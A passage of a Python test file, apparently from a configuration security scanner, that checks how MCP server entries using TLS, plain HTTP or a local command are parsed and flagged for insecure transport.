        resource_type="mcp-config",
        metadata={"servers": [remote]},
    )
    assert "mcp-plain-http" in {factor.id for factor in assess(finding).factors}


def test_a_url_redaction_leaves_plaintext_or_tls_as_it_was():
    document = {
        "mcpServers": {
            "tls": {"type": "http", "url": "https://mcp.tls.example:8080/mcp"},
            "plain": {"type": "http", "url": "http://mcp.plain.example/mcp"},
            "other": {"command": "node", "args": ["server.js"], "env": {"A": "8080"}},
        }
    }
    records = {record["name"]: record for record in _parse_mcp_servers(".mcp.json", json.dumps(document), [])}
    assert "plaintext_transport" not in records["tls"] and assess_server(records["tls"]) == []
    # Still readable as plaintext from the record itself, so no marker is needed.
    assert "plaintext_transport" not in records["plain"]
    assert assess_server(records["plain"]) == [McpRisk("mcp-insecure-transport", "mcp.plain.example")]
